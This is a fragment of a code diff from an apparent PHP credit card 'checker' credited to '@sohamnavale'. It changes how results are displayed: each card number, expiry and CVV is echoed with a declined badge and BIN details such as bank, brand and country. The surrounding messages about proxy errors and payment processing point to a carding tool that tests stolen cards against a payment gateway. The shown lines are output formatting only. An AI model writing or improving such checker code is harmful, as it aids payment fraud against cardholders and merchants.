+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 elseif 
 (strpos($result3,  'An error occurred while processing your card. Try again in a little bit.')) {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='white'><font class='badge badge-light'>Proxy Error [ Soham ] </i></font> <br> <font class='badge badge-primary'>$bank [$country] - $type</i></font> <br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='white'><font class='badge badge-light'>Proxy Error [ Soham ] </i></font> <br> <font class='badge badge-primary'>Bank = [$bank] Type = [$type] Scheme = [$scheme1] Brand = [$brand] Country = [$country] Currency = [$currency]</i></font> <br>";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 else {
-  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card was Declined due to an Unknown Error [ Soham ]  </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";
+  echo "<font size=2 color='white'>  <font class='badge badge-danger'> Reprovada ⍋ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card was Declined due to an Unknown Error [ Soham ]  </i></font><br> ";
+  echo "<b>Bank</b> : $bank<br>";
+  echo "<b>Type</b> : $type<br>";
+  echo "<b>Scheme</b> : $scheme1<br>";
+  echo "<b>Brand</b> : $brand<br>";
+  echo "<b>Currency</b> : $currency<br>";
+  echo "<b>Country</b> :  $country<br>";
 }
 
 curl_close($ch);
@@ -587,5 +972,5 @@ ob_flush();
 ///echo "<b>Result:</b> $message<br><br>";
 ///echo "<b>Charge:</b> 1$<br><br>";
 ///echo "<b>Checker Made By:</b> @sohamnavale<br><br>";
-echo $message;
+///echo $message;
 ?>
